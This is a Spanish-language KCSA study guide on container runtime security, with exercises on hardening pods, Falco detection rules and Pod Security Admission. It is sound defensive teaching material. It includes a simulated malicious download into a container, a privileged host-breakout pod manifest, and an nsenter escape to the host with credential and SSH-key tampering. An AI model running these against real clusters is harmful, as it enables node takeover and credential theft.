# Guía de Estudio KCSA: Tema 4.4 — Ejecución de Código Malicioso y Aplicaciones Comprometidas en Contenedores

**Dominio:** Container Security & Runtime Security  
**Peso en el Examen:** ~2.29%  
**Audiencia Objetivo:** SREs, DevSecOps Engineers y Cloud Native Security Architects  

---

## 1. Desglose Técnico Profundo y Arquitectura

### 1.1 Mecánica del Compromiso de Contenedores
En un entorno contenedorizado, los contenedores comparten el kernel de Linux de la máquina host. Una aplicación comprometida (por ejemplo, a través de una Ejecución Remota de Código [RCE], envenenamiento de dependencias o vulnerabilidades de aplicaciones web como inyección de comandos) permite a un atacante ejecutar código no autorizado dentro del contexto de ejecución del proceso del contenedor. 

El radio de impacto (blast radius) de la ejecución de código malicioso se rige por cuatro límites primarios:
1. **Identidad de Usuario y Nivel de Privilegio (`UID 0` vs. Usuarios sin privilegios):** Ejecutar como `root` (`UID 0`) dentro de un contenedor otorga acceso completo a los recursos del contenedor e incrementa significativamente la superficie de ataque contra el kernel. Si los namespaces de usuario del kernel (`userns`) no están activos, el `root` del contenedor se mapea directamente al `root` del host (`UID 0`).
2. **Linux Capabilities:** Las capabilities dividen los privilegios de `root` en unidades granulares (por ejemplo, `CAP_NET_RAW`, `CAP_SYS_ADMIN`, `CAP_CHOWN`). Retener las Linux capabilities predeterminadas permite a un atacante manipular la red, realizar inspección de paquetes en bruto (raw packet inspection), montar sistemas de archivos o cargar módulos del kernel si el aislamiento del contenedor es débil.
3. **Inmutabilidad del Sistema de Archivos:** Un sistema de archivos raíz escribible permite a los atacantes descargar payloads maliciosos (por ejemplo, mineros de criptomonedas, implantes C2), modificar binarios del sistema en `/bin` o `/usr/bin`, alterar librerías compartidas (`/lib64`) o instalar scripts de persistencia.
4. **Superficie de Llamadas al Sistema del Kernel (Syscall Surface):** Los contenedores interactúan con el kernel mediante llamadas al sistema (`syscalls`). El acceso no restringido a syscalls permite que procesos maliciosos interactúen con vulnerabilidades del subsistema del kernel del host (por ejemplo, `unshare`, `ptrace`, `bpf`).

```
+-----------------------------------------------------------------------------------+
|                                  HOST KERNEL                                      |
|  +-----------------------------------------------------------------------------+  |
|  |                             Seccomp Filter                                  |  |
|  +-----------------------------------------------------------------------------+  |
|          ^                                             ^                          |
|          | Blocked Syscalls                            | Allowed Syscalls         |
+----------|---------------------------------------------|--------------------------+
           |                                             |
+----------|---------------------------------------------|--------------------------+
|  CONTAINER NAMESPACE                                   |                          |
|  +-----------------------------+             +-----------------------------+  |
|  |   COMPROMISED CONTAINER     |             |     HARDENED CONTAINER      |  |
|  |  - UID: 0 (root)            |             |  - UID: 10001 (non-root)    |  |
|  |  - Writable Filesystem      |             |  - Read-Only Root FS        |  |
|  |  - Capabilities: Default    |             |  - Capabilities: Drop ALL   |  |
|  |  - Syscall Surface: Full    |             |  - Seccomp: RuntimeDefault  |  |
|  |  [ Malicious Payload Exec ] |             |  [ Execution Blocked ]      |  |
|  +-----------------------------+             +-----------------------------+  |
+-----------------------------------------------------------------------------------+
```

### 1.2 Compromisos Arquitectónicos de Defensa en Profundidad

| Control de Seguridad | Mecanismo Técnico | Ventaja en Producción | Compromiso Operativo |
| :--- | :--- | :--- | :--- |
| **Ejecución Non-Root** (`runAsNonRoot`) | Fuerza `setuid`/`setgid` a IDs no nulos antes de la ejecución del entrypoint. | Evita que los procesos contenedorizados realicen operaciones de root a nivel de host al escapar del contenedor. | Requiere imágenes de contenedor construidas con usuarios predeterminados non-root o mapeos UID/GID definidos explícitamente. |
| **Sistema de Archivos Raíz de Solo Lectura** (`readOnlyRootFilesystem`) | Monta la raíz (`/`) como solo lectura mediante los flags `pivot_root`/`chroot`. | Previene la descarga de binarios, mineros de criptomonedas y modificaciones de archivos persistentes. | Exige montajes de `emptyDir` explícitos para directorios de aplicaciones que requieran acceso temporal de escritura (por ejemplo, `/tmp`, directorios de logs). |
| **Eliminación de Capabilities** (`capabilities: drop: ["ALL"]`) | Limpia el conjunto delimitador de capabilities del proceso (`PR_CAPBSET_DROP`). | Minimiza las primitivas de explotación del kernel (por ejemplo, sockets en bruto, chown, rastreo de procesos). | Las aplicaciones que requieren privilegios específicos de bajo nivel (por ejemplo, vincularse al puerto 80 mediante `CAP_NET_BIND_SERVICE`) requieren adiciones granulares de capabilities. |
| **Perfilado Seccomp** (`seccompProfile`) | Carga filtros de máquina de estados `bpf` mediante `prctl(PR_SET_SECCOMP)` para restringir syscalls. | Previene la ejecución de llamadas al sistema del kernel peligrosas o no utilizadas (`ptrace`, `kexec_load`). | Perfiles mal configurados pueden bloquear syscalls legítimas de la aplicación, provocando fallos en runtime. |
| **Motor de Auditoría en Runtime** (ej. Falco) | Captura eventos del kernel a través de sondas eBPF o tracepoints de módulos del kernel en `sys_enter`/`sys_exit`. | Detecta árboles generadores de procesos anómalos (por ejemplo, `nginx` generando `sh`), modificaciones de archivos y conexiones salientes inesperadas en tiempo real. | Genera sobrecarga de telemetría y requiere ajustar reglas para evitar la fatiga por alertas. |

### 1.3 Referencias Oficiales y Estándares
- [CNCF KCSA Curriculum v1.0](https://github.com/cncf/curriculum/raw/master/KCSA%20Curriculum.pdf)
- [Kubernetes Documentation: Configure a Security Context for a Pod or Container](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
- [Kubernetes Documentation: Pod Security Standards](https://kubernetes.io/docs/concepts/security/pod-security-standards/)
- [Falco Documentation: Container Threat Detection & Rules Engine](https://falco.org/docs/rules/)
- [NIST SP 800-190: Application Container Security Guide](https://csrc.nist.gov/publications/detail/sp/800-190/final)

---

## 2. Ejercicios Prácticos Guiados de Producción

### Ejercicio 1: Aseguramiento de Cargas de Trabajo Contra la Ejecución Arbitraria de Código y la Escalada Dentro del Contenedor

#### Paso 1: Desplegar un Manifiesto de Pod Vulnerable/No Confinado
Crear un manifiesto llamado `vulnerable-pod.yaml` que represente una aplicación vulnerable desplegada con contextos de seguridad predeterminados y no confinados (ejecutándose como root con un sistema de archivos raíz escribible).

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: vulnerable-app-pod
  namespace: default
  labels:
    tier: frontend
    security-state: unconfined
spec:
  containers:
  - name: vulnerable-container
    image: ubuntu:22.04
    command: ["/bin/bash", "-c", "sleep 3600"]
```

Aplicar el manifiesto de despliegue:

```bash
kubectl apply -f vulnerable-pod.yaml
```

Salida esperada:
```text
pod/vulnerable-app-pod created
```

#### Paso 2: Simular la Ejecución de Código Malicioso y el Ingreso de Payloads Remotos
Simular que un atacante obtiene la ejecución de comandos arbitrarios dentro del contenedor a través de RCE, instalando paquetes no autorizados (`curl`), dejando un binario no aprobado en `/tmp` y modificando binarios del sistema.

```bash
kubectl exec -it vulnerable-app-pod -- bash -c "apt-get update && apt-get install -y curl && curl -o /tmp/malicious_miner https://httpbin.org/bytes/1024 && chmod +x /tmp/malicious_miner && echo 'hacked' > /usr/bin/compromised_binary"
```

Salida esperada:
```text
Get:1 http://archive.ubuntu.com/ubuntu jammy InRelease [270 kB]
...
Setting up curl (7.81.0-1ubuntu1.16) ...
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1024  100  1024    0     0   3120      0 --:--:-- --:--:-- --:--:--  3122
```

Verificar que el payload no autorizado existe y que se otorgaron permisos de ejecución:

```bash
kubectl exec -it vulnerable-app-pod -- ls -l /tmp/malicious_miner /usr/bin/compromised_binary
```

Salida esperada:
```text
-rwxr-xr-x 1 root root 1024 Aug  7 20:15 /tmp/malicious_miner
-rw-r--r-- 1 root root    7 Aug  7 20:15 /usr/bin/compromised_binary
```

#### Paso 3: Inspeccionar las Capabilities del Proceso y el Contexto de UID
Examinar las Linux capabilities activas asignadas al proceso del contenedor. Observar que se retienen las capabilities predeterminadas (`CAP_NET_RAW`, `CAP_SYS_CHROOT`, `CAP_MKNOD`, etc.).

```bash
kubectl exec -it vulnerable-app-pod -- grep Cap /proc/1/status
```

Salida esperada:
```text
CapInh:	0000000000000000
CapPrm:	00000000a80425fb
CapEff:	00000000a80425fb
CapBnd:	00000000a80425fb
CapAmb:	0000000000000000
```

Decodificar la máscara de bits de Effective Capabilities (`00000000a80425fb`) usando `capsh` (o `capsh --decode` si está disponible en el host):

```bash
capsh --decode=00000000a80425fb
```

Salida esperada:
```text
00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
```

#### Paso 4: Construir y Aplicar un Manifiesto de Pod Asegurado de Nivel de Producción
Crear un nuevo archivo llamado `hardened-pod.yaml`. Este manifiesto impone:
- Ejecución de usuario non-root (`runAsNonRoot: true`, `runAsUser: 10001`)
- Eliminación completa de todas las Linux capabilities (`drop: ["ALL"]`)
- Desactivación de la escalada de privilegios (`allowPrivilegeEscalation: false`)
- Inmutabilidad del sistema de archivos raíz (`readOnlyRootFilesystem: true`)
- Aplicación del perfil Seccomp estándar (`type: RuntimeDefault`)
- Montaje explícito de `emptyDir` para escrituras en el directorio temporal designado.

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: hardened-app-pod
  namespace: default
  labels:
    tier: frontend
    security-state: hardened
spec:
  securityContext:
    runAsNonRoot: true
    runAsUser: 10001
    runAsGroup: 10001
    fsGroup: 10001
    seccompProfile:
      type: RuntimeDefault
  containers:
  - name: hardened-container
    image: ubuntu:22.04
    command: ["/bin/bash", "-c", "sleep 3600"]
    securityContext:
      allowPrivilegeEscalation: false
      readOnlyRootFilesystem: true
      capabilities:
        drop:
        - ALL
    volumeMounts:
    - mountPath: /tmp
      name: tmp-volume
  volumes:
  - name: tmp-volume
    emptyDir:
      medium: Memory
      sizeLimit: 64Mi
```

Aplicar el manifiesto asegurado:

```bash
kubectl apply -f hardened-pod.yaml
```

Salida esperada:
```text
pod/hardened-app-pod created
```

#### Paso 5: Verificar la Mitigación de los Vectores de Ejecución Maliciosa
Intentar ejecutar gestores de paquetes o escribir en directorios protegidos del sistema (`/usr/bin`) dentro del pod asegurado.

```bash
kubectl exec -it hardened-app-pod -- touch /usr/bin/malicious_payload
```

Salida esperada:
```text
touch: cannot touch '/usr/bin/malicious_payload': Read-only file system
command terminated with exit code 1
```

Intentar modificar las fuentes de paquetes o binarios del sistema:

```bash
kubectl exec -it hardened-app-pod -- apt-get update
```

Salida esperada:
```text
Reading package lists... Done
E: List directory /var/lib/apt/lists/partial is missing. - Acquire (30: Read-only file system)
E: Could not open lock file /var/lib/apt/lists/lock - open (30: Read-only file system)
E: Unable to lock the administration directory (/var/lib/apt/lists/), are you root?
command terminated with exit code 100
```

Verificar que las capabilities del proceso estén completamente limpias (`0000000000000000`):

```bash
kubectl exec -it hardened-app-pod -- grep Cap /proc/1/status
```

Salida esperada:
```text
CapInh:	0000000000000000
CapPrm:	0000000000000000
CapEff:	0000000000000000
CapBnd:	0000000000000000
CapAmb:	0000000000000000
```

---

#### Preguntas de Verificación — Ejercicio 1
1. **Pregunta 1.1:** ¿Por qué establecer `readOnlyRootFilesystem: true` previene que un atacante persista un payload binario descargado y cómo maneja la aplicación las operaciones legítimas de escritura (por ejemplo, caché o archivos temporales) sin romperse?
2. **Pregunta 1.2:** Si un contenedor que se ejecuta como `UID 10001` con `capabilities.drop: ["ALL"]` explota una vulnerabilidad en un binario de la aplicación que tiene el bit SUID activo (`-rwsr-xr-x`), ¿el proceso escalará con éxito los privilegios a `root`? Explique el mecanismo.

---

### Ejercicio 2: Detección de Amenazas en Runtime de Ejecución Maliciosa Mediante Auditoría de Syscalls (Falco)

#### Paso 1: Definir una Regla de Seguridad Personalizada de Falco
En este paso, construya una regla personalizada para el motor de seguridad en runtime CNCF Falco para detectar invocaciones inesperadas de shells y la ejecución de gestores de paquetes dentro de contenedores en producción.

Crear un archivo local de definición de reglas llamado `falco_custom_rules.yaml`:

```yaml
- rule: Terminal Shell Spawned in Container
  desc: Detects an interactive terminal shell executed inside a running container context
  condition: >
    spawned_process and 
    container and 
    proc.name in (bash, sh, zsh, ksh, csh) and 
    not user_expected_terminal_shells
  output: >
    ALERT Malicious Terminal Executed (user=%user.name user_id=%user.uid 
    container_id=%container.id container_name=%container.name 
    image=%container.image.repository process=%proc.name cmdline=%proc.cmdline 
    parent=%proc.pname)
  priority: WARNING
  tags: [container, runtime, execution, mitre_execution]

- rule: Package Management Executed in Container
  desc: Detects execution of package managers inside a running container at runtime
  condition: >
    spawned_process and 
    container and 
    proc.name in (apt, apt-get, dpkg, yum, dnf, apk)
  output: >
    CRITICAL Package Manager Triggered in Container (user=%user.name 
    container_name=%container.name image=%container.image.repository 
    cmdline=%proc.cmdline)
  priority: CRITICAL
  tags: [container, runtime, persistence]
```

#### Paso 2: Simular la Generación de Eventos de Falco en Runtime
Simular un evento de Falco generando un shell y ejecutando `apk` o `apt-get` dentro de un pod llamado `monitored-app-pod`.

Desplegar un pod objetivo:

```bash
kubectl run monitored-app-pod --image=nginx:alpine --restart=Never
```

Salida esperada:
```text
pod/monitored-app-pod created
```

Ejecutar un comando interactivo que active ambas condiciones de las reglas (`spawned_process` del shell y ejecución del gestor de paquetes `apk`):

```bash
kubectl exec -it monitored-app-pod -- sh -c "apk add --no-cache curl"
```

Salida esperada:
```text
fetch https://dl-cdn.alpinelinux.org/alpine/v3.18/main/x86_64/APKINDEX.tar.gz
fetch https://dl-cdn.alpinelinux.org/alpine/v3.18/community/x86_64/APKINDEX.tar.gz
(1/5) Installing ca-certificates (20230506-r0)
...
OK: 11 MiB in 22 packages
```

#### Paso 3: Inspeccionar los Logs de Telemetría del Sensor de Falco
Consultar los logs del daemonset de Falco (o los logs del servicio systemd local si se ejecuta directamente en el nodo host) para confirmar la detección de llamadas al sistema (`execve`) asociadas con el patrón malicioso.

```bash
kubectl logs -n falco -l app.kubernetes.io/name=falco --tail=100 | grep -E "CRITICAL|WARNING"
```

Salida esperada:
```json
{"severity":"Warning","time":"2026-08-07T20:22:04.182948123Z","rule":"Terminal Shell Spawned in Container","output":"20:22:04.182948123: WARNING ALERT Malicious Terminal Executed (user=root user_id=0 container_id=a3f89d12c4b1 container_name=monitored-app-pod image=nginx process=sh cmdline=sh -c apk add --no-cache curl parent=containerd)","output_fields":{"container.id":"a3f89d12c4b1","container.image.repository":"nginx","container.name":"monitored-app-pod","proc.cmdline":"sh -c apk add --no-cache curl","proc.name":"sh","proc.pname":"containerd","user.name":"root","user.uid":0}}
{"severity":"Critical","time":"2026-08-07T20:22:04.210481902Z","rule":"Package Management Executed in Container","output":"20:22:04.210481902: CRITICAL Package Manager Triggered in Container (user=root container_name=monitored-app-pod image=nginx cmdline=apk add --no-cache curl)","output_fields":{"container.image.repository":"nginx","container.name":"monitored-app-pod","proc.cmdline":"apk add --no-cache curl","proc.name":"apk","user.name":"root"}}
```

---

#### Preguntas de Verificación — Ejercicio 2
1. **Pregunta 2.1:** ¿De qué interfaz de bajo nivel del kernel de Linux se aprovecha Falco para interceptar invocaciones de llamadas al sistema (por ejemplo, `execve`, `connect`, `openat`) sin modificar las imágenes de los contenedores ni el código fuente de la aplicación?
2. **Pregunta 2.2:** Si un atacante ejecuta un binario compilado estáticamente mediante redirección de entrada estándar (`cat miner.hex | xxd -r | perl`) sin llamar a un binario de shell interactivo como `/bin/sh`, ¿qué condición de Falco seguirá capturando el evento de ejecución?

---

### Ejercicio 3: Prevención de Escapes de Contenedor y Fugas de Namespaces del Host con Pod Security Admission

#### Paso 1: Analizar un Manifiesto Malicioso de Escape al Host
Revisar un manifiesto peligroso (`host-breakout-pod.yaml`) diseñado para comprometer el nodo worker subyacente de Kubernetes al compartir el namespace PID del host, montar el sistema de archivos raíz del host (`/`) y solicitar `CAP_SYS_ADMIN`.

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: malicious-breakout-pod
  namespace: target-workloads
spec:
  hostPID: true
  containers:
  - name: escape-container
    image: ubuntu:22.04
    command: ["/bin/bash", "-c", "chroot /host /bin/bash"]
    securityContext:
      privileged: true
    volumeMounts:
    - mountPath: /host
      name: host-root
  volumes:
  - name: host-root
    hostPath:
      path: /
```

#### Paso 2: Configurar la Aplicación del Namespace a Través de Pod Security Admission (PSA)
Etiquetar el namespace objetivo `target-workloads` con el perfil incorporado `restricted` de Pod Security Standard en modo `enforce`.

Crear el manifiesto del namespace `namespace-security.yaml`:

```yaml
apiVersion: v1
kind: Namespace
metadata:
  name: target-workloads
  labels:
    pod-security.kubernetes.io/enforce: restricted
    pod-security.kubernetes.io/enforce-version: latest
    pod-security.kubernetes.io/warn: restricted
    pod-security.kubernetes.io/warn-version: latest
```

Aplicar la definición del namespace:

```bash
kubectl apply -f namespace-security.yaml
```

Salida esperada:
```text
namespace/target-workloads created
```

#### Paso 3: Probar el Rechazo por Control de Admisión de Cargas de Trabajo No Conformes
Intentar desplegar el manifiesto `host-breakout-pod.yaml` en el namespace asegurado `target-workloads`.

```bash
kubectl apply -f host-breakout-pod.yaml -n target-workloads
```

Salida esperada:
```text
Error from server (Forbidden): error when creating "host-breakout-pod.yaml": pods "malicious-breakout-pod" is forbidden: violates PodSecurity "restricted:latest": host namespaces (hostPID=true), privileged (container "escape-container" must not set securityContext.privileged=true), allowPrivilegeEscalation != false (container "escape-container" must set securityContext.allowPrivilegeEscalation=false), unrestricted capabilities (container "escape-container" must set securityContext.capabilities.drop=["ALL"]), runAsNonRoot != true (pod or container "escape-container" must set securityContext.runAsNonRoot=true), seccompProfile (pod or container "escape-container" must set securityContext.seccompProfile.type to "RuntimeDefault" or "Localhost")
```

#### Paso 4: Validar los Logs de Auditoría de Admisión
Inspeccionar los logs de auditoría del API server para verificar que el evento de violación de directivas se registró para el monitoreo de seguridad.

```bash
grep "malicious-breakout-pod" /var/log/kubernetes/kube-apiserver-audit.log | grep "annotations"
```

Fragmento de salida esperada:
```json
{"kind":"Event","apiVersion":"audit.k8s.io/v1","level":"Request","stage":"ResponseComplete","requestURI":"/api/v1/namespaces/target-workloads/pods","verb":"create","user":{"username":"kubernetes-admin","groups":["system:masters"]},"responseStatus":{"metadata":{},"status":"Failure","message":"pods \"malicious-breakout-pod\" is forbidden...","reason":"Forbidden","code":403},"annotations":{"pod-security.kubernetes.io/enforce-policy":"restricted:latest","pod-security.kubernetes.io/audit-decision":"deny"}}
```

---

#### Preguntas de Verificación — Ejercicio 3
1. **Pregunta 3.1:** ¿Qué vector de amenaza específico introduce configurar `hostPID: true`, y cómo puede un atacante aprovecharlo junto con un path montado del host o elevadas capabilities para escapar al nodo host?
2. **Pregunta 3.2:** ¿En qué se diferencia Kubernetes Pod Security Admission (PSA) de controladores de admisión de terceros como Kyverno u OPA/Gatekeeper en términos de arquitectura de implementación y ciclo de vida de ejecución?

---

## 3. Clave de Respuestas y Explicaciones Detalladas

<details>
<summary>Click to view Answers and Technical Explanations</summary>

### Respuestas del Ejercicio 1

**1.1 Mecánica de Sistema de Archivos Raíz de Solo Lectura y Manejo Operativo:**
* **Mecanismo Técnico:** Cuando se configura `readOnlyRootFilesystem: true`, el runtime del contenedor monta la capa raíz (`/`) usando la bandera de solo lectura (`MS_RDONLY`) durante `pivot_root` o `chroot`. Si un atacante ejecuta código arbitrario (por ejemplo, a través de RCE), cualquier syscall que intente escribir en el disco (como `open()` con `O_CREAT` o `O_WRONLY`, `write()`, `link()` o `unlink()`) devuelve el código de error `EROFS` (`Read-only file system`). Los payloads descargados no se pueden guardar y la alteración de configuraciones o binarios se bloquea.
* **Manejo de Escrituras Legítimas:** Las aplicaciones que requieren acceso de escritura para estado, archivos temporales o sockets deben declarar explícitamente volúmenes efímeros (montajes `emptyDir` o volúmenes persistentes) dirigidos a directorios específicos (por ejemplo, `/tmp`, `/var/run`, `/var/cache`). En `hardened-pod.yaml`, un `emptyDir` respaldado por memoria (`medium: Memory`) se monta en `/tmp`, confinando las operaciones de escritura a un búfer efímero y delimitado en tamaño mientras se mantiene inmutable el resto del sistema de archivos.

**1.2 Escalada de Privilegios y `allowPrivilegeEscalation: false`:**
* **Mecanismo Técnico:** Establecer `allowPrivilegeEscalation: false` configura directamente el bit `no_new_privs` en el kernel de Linux para el proceso del contenedor mediante `prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0)`.
* **Resultado de Ejecución:** Incluso si un atacante encuentra un binario ejecutable dentro del contenedor con el bit SUID activo (`-rwsr-xr-x`), el kernel deshabilita la transición de privilegios durante la llamada al sistema `execve()`. El proceso **no** adquirirá privilegios de `UID 0` ni capabilities. Además, dado que `capabilities.drop: ["ALL"]` limpia el conjunto delimitador de capabilities, el proceso no puede elevar su conjunto de Effective Capabilities independientemente de las banderas del binario.

---

### Respuestas del Ejercicio 2

**2.1 Subsistema de Rastreo del Kernel utilizado por Falco:**
* **Mecanismo Técnico:** Falco captura eventos del kernel en runtime utilizando programas **eBPF (Extended Berkeley Packet Filter)** vinculados a tracepoints del kernel (`sys_enter` y `sys_exit`), o a través de un módulo del kernel heredado de búfer circular (`falco.ko`).
* **Por qué es importante:** Debido a que la auditoría de syscalls ocurre dentro del espacio del kernel del host, la captura de eventos es fuera de banda y transparente para el entorno contenedorizado. Un atacante dentro de un contenedor comprometido no puede manipular, desactivar ni engañar al sensor modificando las librerías o binarios del espacio de usuario del contenedor (`libc`, `bash`).

**2.2 Captura de Syscalls Más Allá de la Generación de Shells:**
* **Comportamiento del Motor de Reglas:** Incluso si un atacante evita invocar procesos de shell como `/bin/sh` o `/bin/bash`, cualquier archivo ejecutable que se ejecute en el sistema debe invocar las llamadas al sistema `execve` o `execveat` para generar un proceso.
* **Detección:** Falco monitorea todas las llamadas al sistema `execve` en tiempo real en todos los procesos del contenedor. Si un atacante ejecuta un binario o invoca un gestor de paquetes (`apk`, `apt`), la macro `spawned_process` se dispara en la llamada al sistema `execve`, extrayendo el nombre del proceso (`proc.name`), la línea de comandos (`proc.cmdline`) y la ancestría del proceso (`proc.pname`), activando alertas independientemente de cómo se haya envuelto la ejecución.

---

### Respuestas del Ejercicio 3

**3.1 Amenazas de `hostPID: true` y Vectores de Escape:**
* **Vector de Amenaza:** Establecer `hostPID: true` rompe el aislamiento del namespace de procesos del contenedor. El proceso contenedorizado comparte la tabla de procesos del sistema operativo del host. El contenedor puede ver todos los procesos ejecutándose en el nodo host (incluidos `kubelet`, `containerd` y daemons del sistema) e inspeccionar las variables de entorno del host mediante `/proc/<host-pid>/environ`.
* **Mecanismo de Escape:** Si se combina con `CAP_SYS_ADMIN` o un contexto de usuario root, un atacante puede usar `nsenter` (por ejemplo, `nsenter -t 1 -m -u -n -i bash`) para adjuntarse al PID 1 (`systemd` en el host), cambiando de namespaces para lograr la toma de control completa del nodo host. Si el sistema de archivos del host `/` está montado, el atacante puede alterar `/etc/shadow`, escribir claves SSH en `/root/.ssh/authorized_keys` o manipular las credenciales de `kubelet` almacenadas en `/var/lib/kubelet/pki/`.

**3.2 Pod Security Admission (PSA) vs. Controladores de Admisión de Terceros:**
* **Arquitectura:** PSA está integrado directamente en el API server de Kubernetes (`kube-apiserver`) como un plugin de admisión. Evalúa las solicitudes de creación/actualización de Pods frente a perfiles predefinidos y estáticos (`privileged`, `baseline`, `restricted`) definidos por los Pod Security Standards oficiales.
* **Rendimiento y Extensibilidad:** Dado que PSA se ejecuta dentro del proceso en `kube-apiserver`, introduce una latencia insignificante y no requiere webhooks fuera del clúster ni CRDs externos. Sin embargo, PSA no puede aplicar lógica personalizada ni mutar manifiestos. Los controladores de terceros (Kyverno, OPA/Gatekeeper) se ejecutan como Dynamic Admission Webhooks externos (`ValidatingWebhookConfiguration` / `MutatingWebhookConfiguration`). Permiten la definición de directivas personalizadas (reglas declarativas basadas en Rego o YAML), marcos de prueba de directivas y mutación de recursos, pero introducen dependencias de red y sobrecarga de procesamiento en el manejo de solicitudes del API server.

</details>

---

## 4. Lista de Control Resumida para el Examen KCSA

- [ ] Reconocer que las configuraciones predeterminadas del contexto de seguridad del contenedor dejan las cargas de trabajo no confinadas (ejecutándose como root, conjuntos delimitadores de capabilities completos, sistemas de archivos raíz escribibles).
- [ ] Comprender el papel de `runAsNonRoot: true`, `runAsUser: <non-zero>`, `allowPrivilegeEscalation: false` y `readOnlyRootFilesystem: true` en la mitigación de la ejecución de código malicioso.
- [ ] Memorizar cómo `seccompProfile: { type: RuntimeDefault }` restringe la superficie de ataque de syscalls del kernel.
- [ ] Comprender los mecanismos de detección en runtime utilizando reglas de Falco (interceptando `execve` mediante tracepoints eBPF).
- [ ] Saber cómo aplicar Pod Security Standards (`restricted`) a nivel de namespace utilizando etiquetas de Pod Security Admission (`pod-security.kubernetes.io/enforce: restricted`).